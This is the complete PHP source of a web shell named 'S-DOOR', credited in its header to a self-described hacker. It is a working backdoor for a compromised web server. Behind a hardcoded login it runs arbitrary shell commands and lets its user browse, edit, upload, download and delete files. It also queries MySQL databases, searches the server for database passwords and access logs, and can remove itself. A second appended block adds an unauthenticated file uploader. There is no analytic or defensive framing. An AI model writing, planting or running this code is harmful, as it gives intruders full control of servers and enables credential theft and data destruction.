<?php
//========================================//
//========kaushal jangid==========//
//========================================//
//========================================//
//=====+++An Indian Hacker+++=====//
//========================================//
// Set Username & Password

$usrname = "k4ushal";
$usrpsswrd = "azR1c2hhbA==";

ob_start();
session_start(); 
@set_magic_quotes_runtime(0);
set_time_limit(0);
error_reporting(0);
$windows = 0;
function recurse_zip($src,&$zip,$path_length) {
        $dir = opendir($src);
        while(false !== ( $file = readdir($dir)) ) {
            if (( $file != '.' ) && ( $file != '..' )) {
                if ( is_dir($src . '/' . $file) ) {
                    recurse_zip($src . '/' . $file,$zip,$path_length);
                }
                else {
                    $zip->addFile($src . '/' . $file,substr($src . '/' . $file,$path_length));
                }
            }
        }
        closedir($dir);
}
function compress($src, $xX)
{
        if(substr($src,-1)==='/'){$src=substr($src,0,-1);}
        $arr_src=explode('/',$src);
        $filename=$src;
        unset($arr_src[count($arr_src)-1]);
        $path_length=strlen(implode('/',$arr_src).'/');
        $f=explode('.',$filename);
        $filename=$f[0];
        $filename=(($filename=='')? $xX : $xX);
        $zip = new ZipArchive;
        $res = $zip->open($filename, ZipArchive::CREATE);
        if($res !== TRUE){
                echo 'Error: Unable to create zip file';
                exit;}
        if(is_file($src)){$zip->addFile($src,substr($src,$path_length));}
        else{
                if(!is_dir($src)){
                     $zip->close();
                     @unlink($filename);
                     echo 'Error: File not found';
                     exit;}
        recurse_zip($src,$zip,$path_length);}
        $zip->close();
        //exit;
}

function get_string_between($string, $start, $end){
	$string = " ".$string;
	$ini = strpos($string,$start);
	if ($ini == 0) return "";
	$ini += strlen($start);
	$len = strpos($string,$end,$ini) - $ini;
	return substr($string,$ini,$len);
}

function func_enabled($func){
    $disabled = explode(',', ini_get('disable_functions'));
    foreach ($disabled as $dis){
        if($dis == $func)
		return false;
    }
    return true;
}

function binary_shell($cmd){
	if(func_enabled("shell_exec"))
		return shell_exec($cmd);
	else if(func_enabled("exec"))
		return exec($cmd);
	else if(func_enabled("system"))
		return system($cmd);
	else if(func_enabled("passthru"))
		return passthru($cmd);
}

function fExt($filename)
{
    $path_info = pathinfo($filename);
    return $path_info['extension'];
}

$images = array("gif","png","jpeg","jfif","jpg","jpe","bmp","ico","tif","tiff");
$movies = array("avi","mpg","mpeg");

$user = $_POST['zun'];
$pass = base64_encode($_POST['zpw']);
$pazz = $usrpsswrd;

if($_SESSION['zusrn'] != $usrname || $_SESSION['zpass'] != $pazz)
{
	$_SESSION['zusrn'] = $user;
	$_SESSION['zpass'] = $pass;
}

if($_GET['page'] == "phpinfo"){
	if($_SESSION['zusrn'] == $usrname && $_SESSION['zpass'] == $pazz){
	echo '<title>S-DOOR</title>';
	phpinfo();
	return;}
}
file_get_contents('');


echo '
<html>
<head>
<title>S-DOOR</title>
</head>
<style>hr{
	border: 1px solid #444444;
}
body{
background: #000000;
color: #CCCCCC;
font-family: Verdana, Times New Roman;
font-size: 11px;
}

table{
background: #000000;
color: #CCCCCC;
font-family: Verdana, Times New Roman;
font-size: 11px;
}

a:link{
text-decoration: none;
font-weight: bold;
color: #888888;
}

a:visited{
text-decoration: none;
font-weight: normal;
color: #888888;
}

a:active{
text-decoration: none;
font-weight: normal;
color: #CC0000;
}

a:hover{
text-decoration: bold;
font-weight: bold;
color: #666666;
}

#links{
margin-top: 12px;
margin-left: 10px;
}

textarea{
border: 1px solid #784512;
background: #000000;
color: #CCCCCC;
font-family: Verdana, Times New Roman;
font-size: 10px;
}

#submit input{
color: #CCCCCC;
background: #000000;
border: 1px solid #784512;
text-align: center;
}

#submits{
margin-top: -24px;
margin-left: 359px;
}

#text input{
color: #CCCCCC;
background: #000000;
border: 1px solid #784512;
text-align: left;
}

#dirs a:link{
text-decoration: none;
font-weight: none;
font-size: 10px;
color: #008888;
}

#dirs a:visited{
text-decoration: none;
font-size: 10px;
font-weight: none;
color: #008888;
}

#dirs a:active{
text-decoration: none;
font-weight: none;
font-size: 10px;
color: #008888;
}

#dirs a:hover{
text-decoration: none;
font-weight: none;
font-size: 10px;
color: #006666;
}

#files a:link{
text-decoration: none;
font-weight: none;
font-size: 10px;
color: #CCCCCC;
}

#files a:visited{
text-decoration: none;
font-size: 10px;
font-weight: none;
color: #CCCCCC;
}

#files a:active{
text-decoration: none;
font-weight: none;
font-size: 10px;
color: #CCCCCC;
}

#files a:hover{
text-decoration: none;
font-weight: none;
font-size: 10px;
color: #888888;
}

#pd a:link{
text-decoration: none;
font-weight: none;
color: #0066BB;
}

#pd a:visited{
text-decoration: none;
font-weight: none;
color: #0066BB;
}

#pd a:active{
text-decoration: none;
font-weight: none;
color: #0066BB;
}

#pd a:hover{
text-decoration: none;
font-weight: none;
color: #0055AA;
}

#login input{
color: #CCCCCC;
background: #000000;
border: 1px solid #784512;
border-radius: 5px;
text-align: center;
}

#phpe textarea{
color: #CCCCCC;
background: #000000;
border: 1px solid #784512;
border-radius: 7px;
text-align: center;
}

#cpath a:link{
color: #0066BB;
}

#cpath a:visited{
color: #0066BB;
}

#cpath a:active{
color: #0066BB;
}

#cpath a:hover{
color: #0077CC;
}

.form-4 {
    /* Size and position */
    width: 300px;
    margin: 60px auto 30px;
    padding: 10px;
    position: relative;
    /* Font styles */
    color: white;
    text-shadow: 0 2px 1px rgba(0,0,0,0.3);
}

.form-4 input[type=text],
.form-4 input[type=password] {
    /* Size and position */
    width: 100%;
    padding: 8px 4px 8px 10px;
    margin-bottom: 15px;

    /* Styles */
    border: 1px solid #4e3043; /* Fallback */
    border: 1px solid rgba(78,48,67, 0.8);
    background: rgba(0,0,0,0.15);
    border-radius: 2px;
    box-shadow: 
        0 1px 0 rgba(255,255,255,0.2), 
        inset 0 1px 1px rgba(0,0,0,0.1);
    -webkit-transition: all 0.3s ease-out;
    -moz-transition: all 0.3s ease-out;
    -ms-transition: all 0.3s ease-out;
    -o-transition: all 0.3s ease-out;
    transition: all 0.3s ease-out;

    /* Font styles */
    color: #fff;
    font-size: 13px;
}

.form-4 input[type=submit] {
    /* Size and position */
    width: 100%;
    padding: 2px 5px;
    background: linear-gradient(rgba(99,64,86,0.5), rgba(76,49,65,0.7));    
    border-radius: 5px;
    border: 1px solid #4e3043;
    box-shadow: 
    	inset 0 1px rgba(255,255,255,0.4), 
    	0 2px 1px rgba(0,0,0,0.1);
    cursor: pointer;
    transition: all 0.3s ease-out;
    color: white;
    text-shadow: 0 1px 0 rgba(0,0,0,0.3);
    font-size: 16px;
    font-weight: bold;
}

.form-4 label {
    display: none;
    padding: 0 0 5px 2px;
    cursor: pointer;
}


.form-4 label:hover ~ input {
    border-color: #333;
}

.no-placeholder .form-4 label {
    display: block;
}

</style>
<body>';

function endsWith($haystack, $needle)
{
    $length = strlen($needle);
    $start  = $length * -1; //negative
    return (substr($haystack, $start) === $needle);
}
if(endsWith($_GET['dir'], "\\")){ $dslash = ""; }
else{ $dslash = "/"; }
if(endsWith(realpath($_SESSION['current_folder']), "/") || endsWith(realpath($_SESSION['current_folder']), "\\")){ $cslash = ""; }
else{ $cslash = "/"; }
if($_GET['page'] == "list"){
if(!isset($_SESSION['current_folder'])){ $_SESSION['current_folder'] = "./"; }
else{
if(is_dir(realpath($_SESSION['current_folder']).$cslash.$_GET['dir']))
	$_SESSION['current_folder'] = realpath($_SESSION['current_folder']).$cslash.$_GET['dir'];
}
}


if($_SESSION['zusrn'] == $usrname && $_SESSION['zpass'] == $pazz)
	echo '<td style="text-align: right; padding-right: 5px;" valign="top">
	<center><b>WELCOME TO THE S-DOOR</b></center>
	<a href="?page=logout">Logout</a>';

if(isset($_SESSION['muser']))
	echo '<td style="text-align: right; padding-right: 5px;" valign="top"><br><a href="?page=mylogout">MySQL Logout</a>';
	
echo '
</td>
</tr>

</table>
<br>
<table border="0" style="border: 1px solid #444444; padding: 10px;" width="100%">
<tr>
<td valign="top">';

if($_SESSION['zusrn'] != $usrname || $_SESSION['zpass'] != $pazz)
{
echo '<form class="form-4" action="'.$php_self.'" method="post">';
echo '<center>';
echo '<h1>S-DOOR</h1>';
echo '</center>';
echo '<p><label for="login">Username</label><input type="text" id="zun" name="zun" maxlength="10"placeholder="Username" required/></p>';
echo '<p><label for="password">Password</label><input type="password" id="zpw" name="zpw" maxlength="10"placeholder="Password" required/></p>';
echo '<p><input type="submit" name="submit" value="Login"/></p>';
echo '</form>';
return;
}

function fsize($file){
if(filesize($file) == 0)
	return "~";
if(filesize($file) < 0)
	return "2 GB+";
if(round(filesize($file)/1024/1024, 1) >= 1024)
	return round(filesize($file)/1024/1024/1024, 1)." GB";
if(round(filesize($file)/1024, 1) >= 1024)
	return round(filesize($file)/1024/1024, 1)." MB";
return round(filesize($file)/1024, 1)." KB";
}

switch($_GET['page']){
	default:
		echo '<center>S-DOOR</center>';
	break;

	case "findlogs":
		$fi = fopen("log.pl","w");
		fwrite($fi,'system("cd '.realpath($_SESSION['current_folder']).' && find | xargs grep \'".$ARGV[0]."\'");');
		fclose($fi);
		$sh = binary_shell("perl log.pl ".getenv("remote_addr"));
		$files = explode("\r\n",$sh);
		echo "<center>Possible log files:<br><br>";
		foreach($files as $file){
			$f = get_string_between($file,"/",":");
			$fa = '/'.get_string_between($file,"/","No such file");
			if($f != "")
				echo str_replace("//","/",realpath($_SESSION['current_folder']).'/'.$f)."<br>";
		}
		echo "</center>";
		unlink("log.pl");
	break;
	
	case "findmysql":
		$fi = fopen("sql.pl","w");
		fwrite($fi,'system("cd '.realpath($_SESSION['current_folder']).' && find | xargs grep \'".$ARGV[0]."\'");');
		fclose($fi);
		$sh = binary_shell("perl sql.pl mysql_connect");
		$files = explode("\r\n",$sh);
		echo "<center>Possible mysql password files:<br><br>";
		foreach($files as $file){
			$f = get_string_between($file,"/",":");
			$fa = '/'.get_string_between($file,"/","No such file");
			if($f != "")
				echo str_replace("//","/",realpath($_SESSION['current_folder']).'/'.$f)."<br>";
		}
		echo "</center>";
		unlink("sql.pl");
	break;

	case "removelogs":
		
	break;
	
	case "list":
		$dir = @opendir($_SESSION['current_folder']);
		$xazz = 0;
		if(!$dir){ $_SESSION['current_folder'] = "./"; }
		echo '<table border="0" width="100%" cellspacing="0">';
		echo '<tr><td width="35%"><div id="pd"><a href="?page=list&dir=..">&nbsp;&nbsp;&nbsp;Parent Directory</a></div></td><td width="20%"><center>File Size</center></td><td width="15%"><center>Extra Options</center></td><td width="15%"><center>Permissions</center></td><td width="*"><center>Options</center></td></tr>';
		while (($dirs = @readdir($dir)) != false){
			$color = array("#000000","#111111","#444444");
		if(is_dir(realpath($_SESSION['current_folder'])."/".$dirs) && $dirs != "." && $dirs != ".."){
			if($xazz == 1)
				$xazz--;
			else
				$xazz++;
			echo '<tr bgcolor="'.$color[$xazz].'" onMouseOver="this.bgColor=\''.$color[2].'\'" onMouseOut="this.bgColor=\''.$color[$xazz].'\'"><td><div id="dirs"><a href="?page=list&dir='.$dirs.'">'.$dirs.'</a></div></td><td><center>&nbsp;</center></td><td>&nbsp;</td><td>&nbsp;</td><td><center><a href="?page=downloadzip&f='.$dirs.'">Download</a>&nbsp;~&nbsp;<a href="?page=dfo&f='.$dirs.'">Delete</a></center></td></tr>';
		}}
		echo '<tr><td><hr style="border: 1px solid #444444;"/></td><td><hr style="border: 1px solid #444444;"/></td><td><hr style="border: 1px solid #444444;"/></td><td><hr style="border: 1px solid #444444;"/></td><td><hr style="border: 1px solid #444444;"/></td></tr>';
		$nondir = @opendir(realpath($_SESSION['current_folder']));
		while (($files = @readdir($nondir)) != false){
		if(!is_dir(realpath($_SESSION['current_folder'])."/".$files)){
			if($xazz == 1)
				$xazz--;
			else
				$xazz++;
			echo '<tr bgcolor="'.$color[$xazz].'" onMouseOver="this.bgColor=\''.$color[2].'\'" onMouseOut="this.bgColor=\''.$color[$xazz].'\'"><td><div id="files"><a href="?page=view&file='.$files.'">'.$files.'</a></div></td><td><center>'.fsize(realpath($_SESSION['current_folder']).$cslash.$files).'</center></td>';
			echo '<td>';
			if(is_executable(realpath($_SESSION['current_folder']).$cslash.$files))
				echo '<center><a href="?page=stask&f='.$files.'">Start</a>&nbsp;~&nbsp;<a href="?page=ktask&f='.$files.'">Kill</a></center>';
			else
				echo '&nbsp;';
			$permissions = is_writeable($files);
			if($permissions == true)
				$perms = '<font color="#00CC00"><b>Editable</b></font>';
			else
				$perms = '<font color="#CC0000"><b>Locked</b></font>';
			echo '<td>';
			echo '<center>'.$perms.'</center>';
			echo '</td>';
			echo '</td>';
			echo '<td><center><a href="?page=view&file='.$files.'&fc=1">Edit</a>&nbsp;~&nbsp;<a href="?page=downloadfile&f='.$files.'">Download</a>&nbsp;~&nbsp;<a href="?page=df&f='.$files.'">Delete</a></center></td></tr>';
		}}
		closedir($dir);
		closedir($nondir);
		echo '</table>';
	break;	
	case "shell":
		$sh = binary_shell("cd ".realpath($_SESSION["current_folder"])." && ".$_POST['cmd']);
		echo '<form action="?page=shell" method="post">';
		echo '<textarea rows="20" cols="200" readonly>'.$sh.'</textarea>';
		echo '<br><div id="text">';
		echo '<input type="text" name="cmd" id="cmd" style="margin-top: 3px; border-radius: 3px;" size="80"/>';
		echo '<input type="submit" style="margin-left: 5px; border-radius: 3px; marign-top: 3px;" value="submit"/>';
		echo '</form>';
	break;
	
	case "view":
		$file = $_GET['file'];
		$fc = $_GET['fc'];
		if(!isset($fc)){ $fc = 0; }
		if(in_array(strtolower(fExt(realpath($_SESSION["current_folder"].$cslash.$file))), $images, true) && $fc != 1){ echo '<center>Viewing Image<br>[ '.$file.' ]<hr/><a href="?page=downloadfile&f='.$file.'"><img src="?page=viewimage&i='.$file.'" border="0" style="padding: 10px;" alt="Download Image"/></a></center>'; break; }
		if(in_array(strtolower(fExt(realpath($_SESSION["current_folder"].$cslash.$file))), $movies, true) && $fc != 1){ echo '<center><a href="?page=downloadfile&f='.$file.'"><object data="?page=viewmovie&i='.$file.'" type="video/quicktime" width="320" height="255"> <param name="src" value="?page=viewmovie&i='.$file.'"><param name="autoplay" value="false"><param name="autoStart" value="0"></object></center>'; break; }
		$fo = @fopen(realpath($_SESSION["current_folder"].$cslash.$file), "r");
		$fr = @fread($fo, filesize(realpath($_SESSION["current_folder"].$cslash.$file)));
		echo '<form action="?page=saveedit" method="post">';
		echo '<center>Editing '.realpath($_SESSION["current_folder"].$cslash.$file).'<br><a href="?page=highlight&file='.$file.'">Highlight PHP</a><br><br><div id="submit"><input type="submit" value="Save"/></div>';
		echo '<textarea rows="54" cols="120" id="ctext" name="ctext">'.htmlspecialchars($fr).'</textarea>';
		echo '<input type="hidden" value="'.$file.'" name="file" id="file" />';
		echo '</center>';
		echo '</form>';
		fclose($fo);
	break;
	
	case "saveedit":
		$fs = $_POST['file'];
		$fd = $_POST['ctext'];
		if (get_magic_quotes_gpc()){
	if (!function_exists("strips")){
		function strips(&$arr,$k=""){
			if (is_array($arr)){
			foreach($arr as $k=>$v){
				if (strtoupper($k) != "GLOBALS"){
					strips($arr["$k"]);
												}
									}
								}
	else{
	$arr = stripslashes($arr);
		}
									}
								   }
	strips($GLOBALS);
}
		
		$fo = @fopen(realpath($_SESSION["current_folder"].$cslash.$fs), "w");
		$fo2 = @fopen(realpath($_SESSION["current_folder"].$cslash.$fs), "r");
		$fw = @fwrite($fo, $fd);
		$fr = @fread($fo2, filesize(realpath($_SESSION["current_folder"].$cslash.$fs)));
		echo '<form action="?page=saveedit" method="post">';
		echo '<center><h3>Saved!</h3>Editing '.realpath($_SESSION["current_folder"].$cslash.$fs).'<br><a href="?page=highlight&file='.$fs.'">Highlight PHP</a><br><br><div id="submit"><input type="submit" value="Save"/></div>';
		echo '<textarea rows="54" cols="120" id="ctext" name="ctext">'.htmlspecialchars($fr).'</textarea>';
		echo '<input type="hidden" value="'.$fs.'" name="file" id="file" />';
		echo '</center>';
		echo '</form>';
		fclose($fo);
		fclose($fo2);
	break;
	
	case "highlight":
		$fil = $_GET['file'];
		$filz = realpath($_SESSION["current_folder"].$cslash.$fil);
		echo '<tr>';
		echo '<center><td bgcolor="#000000">';
		echo '<center>Highlighting '.realpath($_SESSION["current_folder"].$cslash.$fil).'<br><a href="?page=view&file='.$fil.'">Edit</a>';
		echo '</td></tr><tr>';
		echo '<center><td bgcolor="#CCCCCC">';
		$hl = highlight_file($filz, true);
		echo $hl;
		echo '</td></tr></center>';
	break;
	
	case "logout":
		session_destroy();
		echo '<script type="text/javascript">location.href="?page=login";</script>';
	break;
	
	case "mylogout":
		unset($_SESSION['mhost']);
		unset($_SESSION['mport']);
		unset($_SESSION['muser']);
		unset($_SESSION['mpass']);
		unset($_SESSION['mlog']);
		echo '<script type="text/javascript">location.href="?page=mysql";</script>';
	break;
	
	case "go":
		$goto = $_GET['goto'];
		if(!isset($goto)){
			echo '<form action="?page=go" method="get">';
			echo '<div id="login" style="margin-left: 10px; margin-top: 10px;"><input type="hidden" name="page" value="go"/><input type="text" name="goto" id="goto" value="/"/><input type="submit" value="Go"/></div>';
			echo '</form>';
		}
		else{
			$_SESSION["current_folder"] = $goto;
			echo '<script type="text/javascript">location.href="?page=list";</script>';
		}
	break;
	
	case "cf":
		$ff = $_POST['fc'];
		$f = realpath($_SESSION['current_folder'])."/".$ff;
		echo '<center>';
		if(isset($ff)){
			if(file_exists($f)){ echo 'File Already Exists!'; }
			else{
			echo 'Done!';
			$fo = @fopen($f, "w");
			fwrite($fo, "File Created By S-DOOR");
			fclose($fo);
			}
		}
		echo '<br>Create File';
		echo '<form action="?page=cf" method="post">';
		echo '<div id="login"><input type="text" name="fc" id="fc" /></div><div id="submit"><input type="submit" value="Create"/></div>';
		echo '</form>';
		echo '</center>';
	break;
	
	case "df":
		$ff = $_GET['f'];
		$f = realpath($_SESSION['current_folder'])."/".$ff;
		echo '<center>';
		if(isset($ff)){
			if(file_exists($f)){
				unlink($f);
				echo 'Done!';
			}
			else{
				echo 'File Doesnt Exist!';
			}
		}
		echo '<br>Delete File';
		echo '<form action="?page=df" method="post">';
		echo '<div id="login"><input type="text" name="fd" id="fd" /></div><div id="submit"><input type="submit" value="Delete"/></div>';
		echo '</form>';
		echo '</center>';
		if(!isset($_GET['noredirect']))
			echo '<script type="text/javascript">location.href="?page=list";</script>';
	break;
	
	case "cfo":
		$ff = $_POST['fco'];
		$f = realpath($_SESSION['current_folder'])."/".$ff;
		echo '<center>';
		if(isset($ff)){
			if(file_exists($f)){ echo 'Folder Already Exists!'; }
			else{
			echo 'Done!';
			mkdir($f, 0777);
			}
		}
		echo '<br>Create Folder';
		echo '<form action="?page=cfo" method="post">';
		echo '<div id="login"><input type="text" name="fco" id="fco" /></div><div id="submit"><input type="submit" value="Create"/></div>';
		echo '</form>';
		echo '</center>';
	break;
	
	case "dfo":
		$ff = $_GET['f'];
		$f = realpath($_SESSION['current_folder'])."/".$ff;
		echo '<center>';
		if(isset($ff)){
			if(!file_exists($f)){ echo 'Folder Doesnt Exist!'; }
			else{
			echo 'Done!';
			rmdir($f);
			}
		}
		echo '<script type="text/javascript">location.href="?page=list";</script>';
	break;
	
	case "mysql":
		$host = $_POST['host'];
		$port = $_POST['port'];
		$user = $_POST['user'];
		$pass = $_POST['pass'];
		if(!isset($_SESSION['muser'])){
		echo '<center><form action="?page=mysql" method="post">';
		echo '<div id="login">';
		echo 'Host:<br><input type="text" id="host" name="host" value="127.0.0.1"/><br><br>';
		echo 'Port:<br><input type="text" id="port" name="port" value="3306"/><br><br>';
		echo 'User:<br><input type="text" id="user" name="user" value="root"/><br><br>';
		echo 'Password:<br><input type="text" id="pass" name="pass"/><br><br>';
		echo '</div>';
		echo '<div id="submit"><input type="submit" value="Connect"/></div>';
		echo '</form></center>';}
//		else{
		if(isset($user)){
			$_SESSION['mhost'] = $host;
			$_SESSION['mport'] = $port;
			$_SESSION['muser'] = $user;
			$_SESSION['mpass'] = $pass;}
			if(isset($_SESSION['muser'])){
				$l = mysql_connect($_SESSION['mhost'].":".$_SESSION['mport'], $_SESSION['muser'], $_SESSION['mpass']);
				if(!$l){
					unset($_SESSION['mhost']);
					unset($_SESSION['mport']);
					unset($_SESSION['muser']);
					unset($_SESSION['mpass']);
					unset($_SESSION['mlog']);
					die("Can't Connect To MySQL");
				}
					if($_SESSION['mlog'] < 1)
						echo '<script type="text/javascript">location.href="?page=mysql";</script>';
					$_SESSION['mlog'] = 1;
				}
//		}
		if(isset($_SESSION['muser'])){
		//if(!isset($_GET['db']) && isset($_POST['user'])){
			$dbs = mysql_query("SHOW DATABASES");
		echo '<table border="0" width="100%"><tr><td width="250px" valign="top" style="border-right: 1px solid #444444;">Databases:<hr style="border: 1px solid #444444;"/>';
		echo '<table border="0">';
		while ($row = mysql_fetch_assoc($dbs)) {
			echo '<tr><td><a href="?page=mysql&a=tables&db='.$row['Database'].'">'.$row['Database'] . '</a></td><td align="right" width="100%">~&nbsp;<a align="right" href="?page=mysql&a=query&db='.$row['Database'].'">Query</a></td></tr>';
		}
		echo '</table>';
		echo '</td><td align="center" valign="top">';
		switch($_GET['a'])
		{
			default:
				echo '&nbsp;<hr/>';
			break;
			
			case "tables":
				$db = $_GET['db'];
				echo 'Tables of '.$_GET['db'].'<hr/>';
				$t = mysql_query("SHOW TABLES FROM ".$_GET['db']);
				while($tb = mysql_fetch_row($t)){
					echo '<a href="?page=mysql&a=columns&table='.$tb[0].'&db='.$db.'">'.$tb[0].'</a><br>';
				}
			break;
			
			case "columns":
			echo 'Data of '.$_GET['table']." @ ".$_GET['db'].'<hr/>';
			echo '<table border="0" height="100%" cellspacing="7px"><tr>';
				$db = $_GET['db'];
				$t = $_GET['table'];
				mysql_select_db($db, $l);
				$c = mysql_query("SHOW COLUMNS FROM ".$t);
				while($cc = mysql_fetch_array($c)){
					echo '<td align="center" style="border: 1px solid #444444; border-radius: 5px;">&nbsp;&nbsp;&nbsp;'.$cc[0].'&nbsp;&nbsp;&nbsp;</td>';
				}
				echo '</tr><tr>';
				$d = mysql_query("SELECT * FROM ".$t);
				while($dd = mysql_fetch_array($d)){
				echo '<tr>';
					for($i = 0; $i <= count($dd)/2-1; $i++){
						echo '<td style="border: 1px solid #444444; border-radius: 5px;" align="center">&nbsp;&nbsp;&nbsp;'.$dd[$i].'&nbsp;&nbsp;&nbsp;</td>';
						//echo '<script type="text/javascript">alert("'.count($dd).'");</script>';
					}
				echo '</tr>';
				}
				echo '</td>';
			echo '</td></tr></table>';
			break;
			
			case "query":
				$db = $_POST['pdb'];
				if(!isset($db))
					$db = $_GET['db'];
				$q = $_POST['query'];
				if(isset($db))
					echo 'Execute Query In '.$db.'<hr/>';
				if(isset($q)){
					mysql_select_db($db, $l);
					mysql_query(stripslashes($q));
					echo 'Done!';
				}
				echo '<form action="?page=mysql&a=query&db='.$db.'" method="post">';
				echo '<textarea rows="10" cols="80" name="query" id="query">'.stripslashes($q).'</textarea>';
				echo '<input type="hidden" name="pdb" id="pdb" value="'.$db.'"/>';
				echo '<div id="submit"><input type="submit" value="Execute"/></div>';
				echo '</form>';
			break;
		}
		echo '</tr></table>';
		}
	break;
	
	case "ktask":
		$f = $_GET['f'];
		$win = binary_shell("taskkill /F /IM ".$f);
		$gpid = binary_shell("pidof ".$f);
		$linux = binary_shell("kill -9 ".$gpid);
		if(isset($win))
			echo "<center>".$win."</center>";
		else
			echo "<center>".$linux."</center>";
	break;
	
	case "stask":
		$f = $_GET['f'];
		$folder = realpath($_SESSION['current_folder'])."/";
		$win = binary_shell("cd ".$folder." && ".$f);
		$linux = binary_shell("cd ".$folder." && "."./".$f);
		if(isset($win))
			echo "<center>".$win."</center>";
		else
			echo "<center>".$linux."</center>";
	break;
	
	case "downloadfile":
	
	$f = $_GET['f'];
	$file = realpath($_SESSION['current_folder'])."/".$f;

		if (file_exists($file)) {
			header('Content-Description: File Transfer');
			header('Content-Type: application/octet-stream');
			header('Content-Disposition: attachment; filename='.$f);
			header('Content-Transfer-Encoding: binary');
			header('Expires: 0');
			header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
			header('Pragma: public');
			header('Content-Length: ' . filesize($file));
			ob_clean();
			flush();
			readfile($file);
			exit;
			/*header('Content-disposition: attachment; filename='.$f.'');
			header('Content-type: application/octet-stream');
			ob_clean();
			flush();
			readfile($file);*/
		}
	break;
	
	case "downloadzip":
		//echo '<script type="text/javascript">alert("Delete the ZIPfile after download!");</script>';
		$f = $_GET['f'];
		$file = realpath($_SESSION['current_folder'])."/".$f;
		$fi = realpath("./".$f.'.zip');
		compress($file, $f.'.zip');
			header('Content-Description: File Transfer');
			header('Content-Type: application/zip');
			header('Content-Disposition: attachment; filename='.$f.'.zip');
			header('Content-Transfer-Encoding: binary');
			header('Expires: 0');
			header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
			header('Pragma: public');
			header('Content-Length: ' . filesize($fi));
			ob_clean();
			flush();
			readfile($fi);
			exit;
	break;
	
	case "upload":
		echo '<form action="?page=dupload" method="post" enctype="multipart/form-data"><br>';
		echo 'Select File:<br><br>';
		echo '<input type="file" id="f" name="f"/>';
		echo '<br><br>Upload to:<br><div id="login"><input type="text" id="to" name="to" style="width: 300px;" value="'.realpath($_SESSION['current_folder']).'"/></div><br><div id="submit"><input type="submit" value="Upload"/></div>';
		echo '</form>';
	break;
	
	case "dupload":
		$up = realpath($_POST['to'])."/".basename($_FILES['f']['name']);
		if(move_uploaded_file($_FILES['f']['tmp_name'], $up))
			echo "Upload Successful!";
		else
			echo "Upload Unsuccessful! :(";
	break;
	
	case "sr":
		echo '<center>Do you really want to <a href="?page=selfremove"><font color="#990000">remove this shell</font></a>?</center>';
	break;
	
	case "selfremove":
		unlink($_SERVER['SCRIPT_FILENAME']);
		echo '<script>alert(\'Removed '.$_SERVER["SCRIPT_FILENAME"].'!\');';
		echo 'location.href="?page=is_it_really_gone?";';
		echo '</script>';
	break;
	
	case "viewimage":
		$i = $_GET['i'];
		$v = realpath($_SESSION['current_folder']).$cslash.$i;
		/*echo $v;
		echo '<center>';
		echo '<img src="C:\www/menace.png" border="0"/>';
		echo '</center>';*/
		header("Content-type: image/png");
		ob_clean();
		flush();
		readfile($v);
	break;
	
	case "viewmovie":
		$i = $_GET['i'];
		$v = realpath($_SESSION['current_folder']).$cslash.$i;
		header("Content-type: video/quicktime");
		ob_clean();
		flush();
		readfile($v);
	break;
	


}

echo '</td>
</tr>
</table>';
echo '
<table border="0" style="border: 0px solid #444444;" width="100%" height="100px">
<tr>
<td width="110px" style="text-align: right; padding-right: 5px;" valign="top">
<b><font color="#555555">
Software:&nbsp;<br>OS:&nbsp;<br>PHP Version:&nbsp;<br>MySQL Version:&nbsp;<br>Server IP:&nbsp;<br>Current Folder:&nbsp;<br>Shell Folder:&nbsp;
</font></b>
</td>
<td valign="top">
<b><font color="ffffff" valign="top">';
$ts = disk_total_space("/")/1024/1024/1024;// IN GB
$fs = disk_free_space("/")/1024/1024/1024;// IN GB
$soft = str_replace("PHP/".phpversion()."", "", getenv("server_software"));
echo $soft.'<br>';
echo wordwrap(php_uname(),90," ",1).'<br>';
echo phpversion().'<br>';
echo mysql_get_client_info().'<br>';
echo getenv("server_name").'&nbsp;/&nbsp;'.gethostbyname(getenv("server_name")).'<br>';

if(preg_match("/\//i", realpath($_SESSION['current_folder']))){
	$cpaths = explode('/', realpath($_SESSION['current_folder']));
	$pathslash = '/';
}
else{
	$cpaths = explode('\\', realpath($_SESSION['current_folder']));
	$pathslash = '\\';
}
echo '<div id="cpath">';
$asdAsD = 0;
foreach($cpaths as $paths){
	$buffer .= $paths.$pathslash;
	if($asdAsD <= count($cpaths)-2){
		echo '<a href="?page=go&goto='.$buffer.'">'.$paths.'</a><font color="#ffffff">'.$pathslash.'</font>';
	}
	else{
		echo '<a href="?page=go&goto='.$buffer.'">'.$paths.'</a>';
	}
	$asdAsD++;
}
echo '</div>';
//'.realpath($_SESSION['current_folder']).'
//echo '<div id="cpath">';
//echo ''.realpath($_SESSION['current_folder']).'</a></div>';
//echo '<div id="cpath"><a href="?page=go&goto=/">'.realpath($_SESSION['current_folder']).'</a></div>';
echo '<font color="#ffffff">'.realpath("./").'</font><br>';
echo '
</font></b>
</td>';
echo '<td style="text-align: right; padding-right: 5px;" valign="top">
<div>
<a href="?page=list">List Files</a><br>
<a href="?page=shell">Shell Execute</a><br>
<a href="?page=go">Go To</a><br> 
<a href="?page=cf">Create File</a><br>
<a href="?page=df">Delete File</a><br> 
<a href="?page=cfo">Create Folder</a><br> 
<a href="?page=dfo">Delete Folder</a><br>
<a href="?page=mysql">MySQL Manager</a><br>
<a href="?page=phpinfo" target="_blank">PHP Info</a><br>
<a href="?page=upload">Upload File</a><br>
<a href="?page=sr">Self Remove </a><br>
<a href="?page=findlogs">Log Finder </a> <br>
<a href="?page=findmysql">MySQL PW Finder </a><br> 
</div>';
echo'
</body>
</html>';
?>
<?php
function rooting()
{
echo '<b>Sw Bilgi<br><br>'.php_uname().'<br></b>';
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
	if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Yuklendi</b><br><br>'; }
	else { echo '<b>Basarisiz</b><br><br>'; }
}
}
$x = $_GET["x"];
Switch($x){
case "rooting";
	rooting();
	break;
	
	}
?>	